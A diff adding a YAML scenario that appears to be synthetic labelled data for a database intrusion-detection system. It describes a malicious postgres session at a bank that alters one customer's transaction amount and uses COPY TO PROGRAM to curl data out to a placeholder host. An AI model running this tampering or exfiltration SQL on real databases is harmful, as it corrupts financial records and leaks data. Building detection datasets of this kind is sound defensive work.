@@ -1,0 +1,23 @@
+scenario_id: gen_banking_29_data_tamper_mal_700
+family_id: gen_banking_29_data_tamper_mal_fam700
+domain: banking
+time_of_day: 02:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: postgres
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.5
+  events:
+  - step_id: act
+    sql: UPDATE transactions SET amount = 666650 WHERE customer_id = 48298
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://customs-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 192.168.24.252
+      port: 5432
